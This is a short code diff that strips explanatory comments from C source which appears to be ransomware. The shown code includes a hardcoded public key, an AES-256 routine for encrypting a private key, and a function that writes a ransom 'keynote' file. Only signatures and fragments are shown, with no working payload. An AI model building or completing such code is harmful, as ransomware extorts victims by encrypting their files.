@@ -73,16 +73,6 @@ BYTE pub_n[512] = { 0xaa, 0xd6, 0x28, 0xf7, 0xb1, 0xe8, 0xeb, 0x1e, 0x16, 0x97, 
 #define BLOCK_SIZE 16 // AES block size in bytes
 #define AES_KEY_SIZE 32 // AES-256 key size in bytes
 
-/************************************************************************************
-*
-* pri_enc : Encrypts plaintext using AES-256 (used for encrypting the private key)
-*
-* input:
-* plain - private key to be encrypted
-* key - encryption key
-* IV - initialization vector
-* cipher - buffer to store the ciphertext
-* *********************************************************************************/
 void pri_enc(unsigned char* plain, unsigned char* key, unsigned char* IV, BYTE* cipher)
 {
     BYTE plaintext[256]; // plaintext to be encrypted
@@ -209,13 +199,6 @@ void pri_enc(unsigned char* plain, unsigned char* key, unsigned char* IV, BYTE* 
     aes_ciphertextLength = 0;
 }
 
-/************************************************************************************
-* make_key_note : Makes the keynote for the ransomware
-*
-* input:
-* key - encryption key
-* iv - initialization vector
-* *********************************************************************************/
 void make_key_note(unsigned char* key, unsigned char* iv)
 {
     const char* filename = "fas_keynote.txt"; // name of the keynote file
